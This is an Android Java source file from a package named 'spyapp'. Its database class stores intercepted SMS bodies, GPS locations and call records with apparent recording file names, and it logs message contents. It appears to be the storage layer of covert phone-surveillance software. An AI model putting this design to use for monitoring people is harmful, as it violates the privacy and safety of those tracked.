package com.example.spyapp;

import android.R.integer;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.provider.OpenableColumns;
import android.util.Log;

public class DatabaseHandler {
	public static final String DB_NAME="goodb.db";
	public static final String MSG_TABLE_NAME="SMSDB";
	public static final String LOCATION_TABLE_NAME="LOCDB";
	public static final String CALL_TABLE_NAME="CALLDB";

	//Coloums for the SMS Database
	public static final String C_TIMESTAMP="TIMESTAMP";
	public static final String C_SENDER="SENDER";
	public static final String C_RECEIVER="RECEIVER";
	public static final String C_BODY="BODY";
	public static final String C_TYPE="TYPE";
	//Coloums for the Location Database
	public static final String L_TIMESTAMP="TIMESTAMP";
	public static final String L_LATITUDE="LATITUDE";
	public static final String L_LONGITUDE="LONGITUDE";
	
	public static final String D_TIMESTAMP="TIMESTAMP";
	public static final String D_TYPE="TYPE";
	public static final String D_DURATION="DURATION";
	public static final String D_TO_FROM="TOFROM";
	public static final String D_FILE="FILENAME";

	
	public String[][] dbentries = new String[1000][150];
	
	public static final int DB_VERSION=1334;
	private static String DB_PATH = ""; 

	static final String TAG="DatabaseHandler";
	
	Context context;
	dbHelper dbhelper;
	
	
	public DatabaseHandler()
	{
	//	this.context=context;
	       DB_PATH = context.getApplicationInfo().dataDir + "/databases/";         
          //Log.d(TAG,DB_PATH);
		dbhelper= new dbHelper();
		//Log.d(TAG,"dbhelper= new dbHelper();");
	
	}
	public DatabaseHandler(Context context)
	{
		this.context=context;
	       DB_PATH = context.getApplicationInfo().dataDir + "/databases/";         
          //Log.d(TAG,DB_PATH);
		dbhelper= new dbHelper();
		//Log.d(TAG,"dbhelper= new dbHelper();");
	
	}
	
	public void insertmsgintodb(long TIMESTAMP, String SENDER , String RECEIVER
			, String BODY,int TYPE)
	{
		SQLiteDatabase sqldb;
		sqldb=dbhelper.getWritableDatabase();
		
		ContentValues values=new ContentValues();
		values.put(C_TIMESTAMP,TIMESTAMP);
		values.put(C_SENDER,SENDER);
		values.put(C_RECEIVER,RECEIVER);
		values.put(C_BODY,BODY);
		values.put(C_TYPE,TYPE);
		 Log.d(TAG,"TIMESTAMP:"+Long.toString(TIMESTAMP));
		 Log.d(TAG,"SENDER:"+SENDER);
         Log.d(TAG,"RECEIVER:"+RECEIVER);
         Log.d(TAG,"BODY:"+BODY);
         Log.d(TAG,"TYPE:"+Integer.toString(TYPE));
         
		sqldb.insert(MSG_TABLE_NAME,null,values);
		sqldb.close();
	}
	

	public void insertlocintodb(long TIMESTAMP, double LATITUDE , double LONGITUDE)
	{
		SQLiteDatabase sqldb;
		sqldb=dbhelper.getWritableDatabase();
		
		ContentValues values=new ContentValues();
		values.put(L_TIMESTAMP,TIMESTAMP);
		values.put(L_LATITUDE,LATITUDE);
		values.put(L_LONGITUDE,LONGITUDE);
      	 Log.d(TAG,"TIMESTAMP:"+Long.toString(TIMESTAMP));
		 Log.d(TAG,"LATITUDE:"+Double.toString(LATITUDE));
         Log.d(TAG,"LONGITUDE:"+Double.toString(LONGITUDE));
            
		sqldb.insert(LOCATION_TABLE_NAME,null,values);
		sqldb.close();
	}
	
	public void insertcallintodb(long TIMESTAMP, int TYPE, Long DURATION,String TO_FROM, String FILENAME)
	{
		SQLiteDatabase sqldb;
		sqldb=dbhelper.getWritableDatabase();
		
		ContentValues values=new ContentValues();
		values.put(D_TIMESTAMP,TIMESTAMP);
		values.put(D_TYPE,TYPE);
		values.put(D_DURATION,DURATION);
		values.put(D_TO_FROM,TO_FROM);
		values.put(D_FILE,FILENAME);
		 Log.d(TAG,"TIMESTAMP:"+Long.toString(TIMESTAMP));
		 Log.d(TAG,"TYPE:"+Integer.toString(TYPE));
         Log.d(TAG,"DURATION:"+Double.toString(DURATION));
         Log.d(TAG,"TO_FROM:"+TO_FROM);
         Log.d(TAG,"FILENAME:"+FILENAME);
		sqldb.insert(CALL_TABLE_NAME,null,values);
		sqldb.close();
	}
	
	public boolean checkTimestampUnique(long timestamp_to_compare) {
        
		SQLiteDatabase sqldb;
        // Select All Quer
		sqldb=dbhelper.getWritableDatabase();
		String selectQuery = "SELECT * FROM " + MSG_TABLE_NAME;
		
   //     SQLiteDatabase db = this.getWritableDatabase();
        Cursor cursor1 = sqldb.rawQuery(selectQuery, null);
        
        //getting the number of rows in the table
       Cursor mCount= sqldb.rawQuery("select * from " + MSG_TABLE_NAME, null);
        mCount.moveToFirst();
        cursor1.moveToFirst();
      //  int rowcount= mCount.getCount();
     //   //Log.d(TAG,"rowcount"+Integer.toString(rowcount));
       
      
        // looping through all rows and adding to list
        if (cursor1 != null && cursor1.moveToFirst()) {
        	do
        	{        		
        	  if (timestamp_to_compare==cursor1.getLong(0))
        	  {
        		//  Log.d(TAG,"TIMESTAMP BEING COMPARED AGAINST:"+
        		//		  Long.toString(cursor1.getLong(0)));
        	//	  Log.d(TAG,"TIMESTAMP"+Long.toString(timestamp_to_compare)+" Not Unique");
        		  return false;
        		  
        	  }  
              	
        	}while(cursor1.moveToNext());
          
        }		
        mCount.close();
        cursor1.close();
        sqldb.close();
        return true;
 
    }
	  public String[][] getAllvalues() {
	        
		  
	        // Select All Query
	     //   int i,j=0;
	        SQLiteDatabase sqldb;
	        
	        sqldb=dbhelper.getWritableDatabase();
				
	        String selectQuery = "SELECT  * FROM " + MSG_TABLE_NAME;
	 
	   //     SQLiteDatabase db = this.getWritableDatabase();
	        Cursor cursor = sqldb.rawQuery(selectQuery, null);
	        
	        //getting the number of rows in the table
	   //     Cursor mCount= sqldb.rawQuery("select count(*) from " + MSG_TABLE_NAME, null);
	    //    mCount.moveToFirst();
	  //      int rowcount= mCount.getInt(0); 	
	       // Log.d(TAG,"rowcount:"+Integer.toString(rowcount));
	  //      mCount.close();
	      
	        // looping through all rows and adding to list
	         
	          cursor.moveToLast();
	          dbentries[0][0]=cursor.getString(0);
	          dbentries[0][1]=cursor.getString(1);
	          dbentries[0][2]=cursor.getString(2);
	          dbentries[0][3]=cursor.getString(3);
	          dbentries[0][4]=cursor.getString(4);
	    /*      
	        if (cursor != null && cursor.moveToFirst()) {
	        	for (i=0;i<5;i++)
	        	{	        		
	        	for(j=0;j<4;j++)
	        	{
	        //		String timestamp_str=Long.toString(cursor.getString(0));
	        	    dbentries[i][j]=cursor.getString(j);
	        		
	        	}
        		
	        	cursor.moveToNext();
	        	}
	        	cursor.moveToFirst();
	        
	          
	        }*/
	      	Log.d(TAG,"TIMESTAMP:"+dbentries[0][0]+"FROM"+dbentries[0][1]
    				+"TO:"+dbentries[0][2]+"MSG:"+dbentries[0][3]+"TYPE:"
    				+dbentries[0][4]);
	      	
	     	sqldb.close();
	        cursor.close();
	        return dbentries;
	 
	    }

	class dbHelper extends SQLiteOpenHelper {

		public dbHelper() {
			
			super(context, DB_NAME, null, DB_VERSION);
			//Log.d(TAG,"Constructor called");
		}

		@Override
		/* Table details
		 * 
		 * TABLE NAME : SMS
		 * TABLE COLOMNS:
		 * 1)TIMESTAMP -> Key field -> LONG
		 * 2)SENDER -> String
		 * 3)RECEIVER -> String
		 * 4)BODY -> String
		 * 5)TYPE -> Integer (1 for Inbox , 2 for Sent) 
		 * 
		 * 
		 */
		public void onCreate(SQLiteDatabase db) {
			//Log.d(TAG,"OnCreate called!");
			String sql1 = String.format("create table if not exists %s" +
					" (%s long primary key,%s text,%s text,%s text,%s int)"
					,MSG_TABLE_NAME,C_TIMESTAMP,C_SENDER,C_RECEIVER,C_BODY,C_TYPE);
			//Log.d(TAG,"onCreate with SQL: "+sql1);
			
			String sql2 = String.format("create table if not exists %s" +
					" (%s long primary key,%s double,%s double)"
					,LOCATION_TABLE_NAME,L_TIMESTAMP,L_LATITUDE,L_LONGITUDE);
			//Log.d(TAG,"onCreate with SQL: "+sql1);
			
			String sql3 = String.format("create table if not exists %s" +
					" (%s long primary key,%s int,%s long,%s text,%s text)"
					,CALL_TABLE_NAME,D_TIMESTAMP,D_TYPE,D_DURATION,D_TO_FROM,D_FILE);
			
			db.execSQL(sql1);
			db.execSQL(sql2);
			db.execSQL(sql3);
			
		}

		
	  
		@Override
		public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
			
		}
		
	}

}

